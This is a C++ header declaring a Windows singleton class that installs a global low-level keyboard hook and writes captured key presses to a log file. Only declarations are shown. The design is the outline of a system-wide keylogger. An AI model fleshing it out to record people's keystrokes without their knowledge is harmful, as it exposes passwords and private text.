#ifndef _KEY_PRESSES_MANAGER_HPP_
#define _KEY_PRESSES_MANAGER_HPP_

#include <windows.h>
#include <iostream>
#include <memory>
#include <atomic>
#include <fstream>
#include <filesystem>

/// <summary>
/// Able to be used only as a singleton
/// </summary>
class KeyPressesManager {
public:
	static std::shared_ptr<KeyPressesManager> CreateManagerInstance();
	KeyPressesManager();
	void Start(const std::filesystem::path& filepath);
	void End();
private:
	static std::ofstream logFile_;
	static std::shared_ptr<KeyPressesManager> instance_;
	static std::atomic_bool running_;
	static DWORD messageLoopThreadId_;


	void unsetGlobalKeyboardHook();
	void setGlobalKeyboardHook();
	static LRESULT CALLBACK lowLevelKeyboardPressCallback(int nCode, WPARAM wParam, LPARAM lParam);

	void messageLoopThread();
};

#endif // !_KEY_PRESSES_MANAGER_HPP_
